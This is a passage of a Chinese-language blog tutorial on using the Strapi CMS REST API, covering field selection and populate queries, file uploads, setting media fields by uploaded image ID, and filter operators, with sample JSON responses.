#D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">"createdAt"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"2024-09-23T16:06:23.045Z"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">"updatedAt"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"2024-09-24T12:51:20.561Z"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">"publishedAt"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"2024-09-24T12:51:20.528Z"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">"locale"</span><span style="color: #D4D4D4">: </span><span style="color: #569CD6">null</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">"avatar"</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"id"</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">32</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"documentId"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"nq7hj2shguktf5begtsluvup"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"name"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"头像.jpg"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"alternativeText"</span><span style="color: #D4D4D4">: </span><span style="color: #569CD6">null</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"caption"</span><span style="color: #D4D4D4">: </span><span style="color: #569CD6">null</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"width"</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">350</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"height"</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">350</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"formats"</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">"thumbnail"</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"ext"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">".jpg"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"url"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"/uploads/thumbnail__993e719107.jpg"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"hash"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"thumbnail__993e719107"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"mime"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"image/jpeg"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"name"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"thumbnail_头像.jpg"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"path"</span><span style="color: #D4D4D4">: </span><span style="color: #569CD6">null</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"size"</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">7.37</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"width"</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">156</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"height"</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">156</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"sizeInBytes"</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">7369</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"hash"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"_993e719107"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"ext"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">".jpg"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"mime"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"image/jpeg"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"size"</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">20.89</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"url"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"/uploads/_993e719107.jpg"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"previewUrl"</span><span style="color: #D4D4D4">: </span><span style="color: #569CD6">null</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"provider"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"local"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"provider_metadata"</span><span style="color: #D4D4D4">: </span><span style="color: #569CD6">null</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"createdAt"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"2024-09-24T12:51:16.512Z"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"updatedAt"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"2024-09-24T12:51:16.512Z"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"publishedAt"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"2024-09-24T12:51:16.513Z"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"locale"</span><span style="color: #D4D4D4">: </span><span style="color: #569CD6">null</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><p>如果带上下面的请求参数</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">GET</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">/api/users/me?fields=username,email,createdAt,updatedAt,id</span><span style="color: #D4D4D4">&amp;</span><span style="color: #DCDCAA">populate[avatar][fields]</span><span style="color: #D4D4D4">=id,height,width,name,updatedAt,ext</span></span></code></pre></div></div></figure><p>则返回数据为</p><figure class="shiki json"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">"id"</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">11</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">"documentId"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"dtree1c2woi3njmz56xmttcm"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">"username"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"xiaowu1"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">"email"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"1681237971@qq.com"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">"createdAt"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"2024-09-23T16:06:23.045Z"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">"updatedAt"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"2024-09-24T12:51:20.561Z"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">"avatar"</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"id"</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">32</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"documentId"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"nq7hj2shguktf5begtsluvup"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"height"</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">350</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"width"</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">350</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"name"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"头像.jpg"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"updatedAt"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"2024-09-24T12:51:16.512Z"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"ext"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">".jpg"</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><h3 id="参数解释"><a class="markdownIt-Anchor" href="#参数解释"></a> 参数解释</h3><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">GET</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">/api/users/me?fields=username,email,createdAt,updatedAt,id</span><span style="color: #D4D4D4">&amp;</span><span style="color: #DCDCAA">populate[avatar][fields]</span><span style="color: #D4D4D4">=id,height,width,name,updatedAt,ext</span></span></code></pre></div></div></figure><p><code>fields</code> 关键字表示要进行第一级的字段选取，<code>populate[第一个参数][第二个参数]</code> 的第一个中括号参数为第二级字段的根节点（这里是 <code>avatar</code>），接着第二个中括号写 <code>fields</code> 关键字，表示要进行选取的字段名，这里是 <code>id,height,width,name,updatedAt,ext</code></p><h2 id="api-文件上传"><a class="markdownIt-Anchor" href="#api-文件上传"></a> API - 文件上传</h2><p>Strapi 的文件上传除了在管理面板中进行上传之外，还可以通过接口的方式进行上传（Strapi 支持 blob、base64 上传，请提前给予权限）</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202409260028631.png" alt="image-20240926002852546"></p><p>请在接口前加上 /api，即：</p><figure class="shiki http"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">http://localhost:1337/api/upload</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202409260029602.png" alt="image-20240926002913544"></p><p>例如在 apifox 中进行测试：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202409260033256.png" alt="image-20240926003359170"></p><h2 id="api-更新包含媒体字段的数据"><a class="markdownIt-Anchor" href="#api-更新包含媒体字段的数据"></a> API - 更新包含媒体字段的数据</h2><p>那么如果我创建了一个数据表其中包含一个媒体字段，如何更新该表中的数据？</p><p>假设该表如下：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202409260036848.png" alt="image-20240926003626793"></p><p>请求接口为：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">POST</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">/api/articles/:id</span></span></code></pre></div></div></figure><p>访问接口文档插件的地址，你会发现它的示例如下：</p><figure class="shiki json"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">"data"</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"title"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"string"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"content"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"string"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"cover_img"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"string or id"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"state"</span><span style="color: #D4D4D4">: </span><span style="color: #569CD6">true</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"article_category"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"string or id"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"author"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"string or id"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"locale"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"string"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">"localizations"</span><span style="color: #D4D4D4">: [</span><span style="color: #CE9178">"string or id"</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">"string or id"</span><span style="color: #D4D4D4">]</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span></code></pre></div></div></figure><p><code>"cover_img": "string or id"</code></p><p>string 或者 id？string 说是网络地址我都能理解，id 是什么？</p><ul><li>实际上该接口仅仅允许你<strong>通过已经上传的图片 id 进行设置 cover_img</strong></li></ul><p><strong>也就是说你要先将更换好的图片进行上传，然后得到它的 id，再将该 id 赋值给 cover_img 才行</strong></p><p><s>折腾了我一晚上，各种曲线救国写的累死人，没想到随意一个测试，原来是这样的…… 哈哈 😎😎</s></p><h2 id="api-strapi-条件查询"><a class="markdownIt-Anchor" href="#api-strapi-条件查询"></a> API-Strapi 条件查询</h2><p>Strapi 如何进行条件查询？</p><blockquote><p>参考文档：</p><ul><li>文档服务 API 可用方法：<a href="https://strapi.nodejs.cn/dev-docs/api/document-service">https://strapi.nodejs.cn/dev-docs/api/document-service</a></li><li> 文档服务 API 过滤器：<a href="https://strapi.nodejs.cn/dev-docs/api/document-service/filters">https://strapi.nodejs.cn/dev-docs/api/document-service/filters</a></li></ul></blockquote><p>总之，Strapi 提供了一些常见的查询操作符，我们可以通过这些操作符进行各种条件查询。常用操作符包括：</p><table><thead><tr><th>操作符</th><th>含义</th><th>示例</th></tr></thead><tbody><tr><td><code>$eq</code></td><td>等于</td><td><code>filters[title][$eq]=Vue.js Tutorial</code></td></tr><tr><td><code>$ne</code></td><td>不等于</td><td><code>filters[title][$ne]=Vue.js Tutorial</code></td></tr><tr><td><code>$lt</code></td><td>小于</td><td><code>filters[views][$lt]=1000</code></td></tr><tr><td><code>$lte</code></td><td>小于等于</td><td><code>filters[views][$lte]=1000</code></td></tr><tr><td><code>$gt</code></td><td>大于</td><td><code>filters[views][$gt]=1000</code></td></tr><tr><td><code>$gte</code></td><td>大于等于</td><td><code>filters[views][$gte]=1000</code></td></tr><tr><td><code>$contains</code></td><td>包含（字符串部分匹配）</td><td><code>filters[title][$contains]=Vue</code></td></tr><tr><td><code>$startsWith</code></td><td>以指定字符串开头</td><td><code>filters[title][$startsWith]=Vue</code></td></tr><tr><td><code>$endsWith</code></td><td>以指定字符串结尾</td><td><code>filters[title][$endsWith]=Tutorial</code></td></tr><tr><td><code>$null</code></td><td>字段值为空</td><td><code>filters[coverImage][$null]=true</code></td></tr><tr><td><code>$in</code></td><td>在给定数组中</td><td><code>filters[category][$in][0]=News</code></td></tr><tr><td><code>$between</code></td><td>在两个值之间</td><td><code>filters[views][$between][0]=10&amp;filters[views][$between][1]=100</code></td></tr></tbody></table><p>示例</p><p>查询 <code>views</code> 字段在 100 和 1000 之间的文章：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">GET</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">/api/articles?filters[views][</span><span style="color: #9CDCFE">$gte</span><span style="color: #CE9178">]=</span><span style="color: #B5CEA8">100</span><span style="color: #D4D4D4">&amp;</span><span style="color: #DCDCAA">filters[views][$lte]</span><span style="color: #D4D4D4">=1000</span></span></code></pre></div></div></figure><p>查询 <code>category</code> 是 "Tech" 或 "News" 的文章：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #DCDCAA">GET</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">/api/articles?filters[category][</span><span style="color: #9CDCFE">$in</span><span style="color: #CE9178">][</span><span style="color: #B5CEA8">0</span><span style="color: #CE9178">]=Tech</span><span style="color: #D4D4D4">&amp;</span><span style="color: #DCDCAA">filters[category][$in][1]</span><span style="color: #D4D4D4">=News</span></span></code></pre></div></div></figure><p>假设数据如下（接口是：/api/articles）</p><figure class="shiki json"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color: #D4D4D4">{</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">"data"</span><span style="color: #D4D4D4">: [</span></span><span class="line"><span style="color: #D4D4D4">    {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">"id"</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">2</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">"documentId"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"fuki5p5xzjnk5n7vfvwzv9c4"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">"title"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"CTF-WP"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">"content"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"&lt;p&gt;这是一份测试内容数据321&lt;/p&gt;"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">"state"</span><span style="color: #D4D4D4">: </span><span style="color: #569CD6">true</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">"createdAt"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"2024-09-25T05:29:27.298Z"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">"updatedAt"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"2024-09-25T17:15:03.198Z"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">"publishedAt"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"2024-09-25T17:15:03.188Z"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">"cover_img"</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"id"</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">45</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"documentId"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"nzpwo3hy9qkesr5l0uqd1k02"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"name"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"1607569780_678488.jpg"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"alternativeText"</span><span style="color: #D4D4D4">: </span><span style="color: #569CD6">null</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"caption"</span><span style="color: #D4D4D4">: </span><span style="color: #569CD6">null</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"width"</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">1920</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"height"</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">1080</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"ext"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">".jpg"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"mime"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"image/jpeg"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"url"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"/uploads/1607569780_678488_991350393d.jpg"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"createdAt"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"2024-09-25T17:15:03.111Z"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"updatedAt"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"2024-09-25T17:15:03.111Z"</span></span><span class="line"><span style="color: #D4D4D4">      },</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">"article_category"</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"id"</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">6</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"documentId"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"qznn6b3nxzqxyv9qlzyu6t65"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"category_name"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"mod修改"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"category_alias"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"mod"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"createdAt"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"2024-09-25T07:58:18.423Z"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"updatedAt"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"2024-09-25T07:58:18.423Z"</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">    {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">"id"</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">4</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">"documentId"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"hevczglj0hqyjc5h5zva0cb9"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">"title"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"这是测试新增文章的标"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">"content"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"&lt;p&gt;托尔斯泰&lt;/p&gt;"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">"state"</span><span style="color: #D4D4D4">: </span><span style="color: #569CD6">true</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">"createdAt"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"2024-09-25T17:33:11.929Z"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">"updatedAt"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"2024-09-25T17:33:11.929Z"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">"publishedAt"</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">"2024-09-25T17:33:11.924Z"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">"cover_img"</span><span style="color: #D4D4D4">: {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"id"</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">48</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">"documentId"</span><span style="color: #D4D4D4">: </span><span style="color: 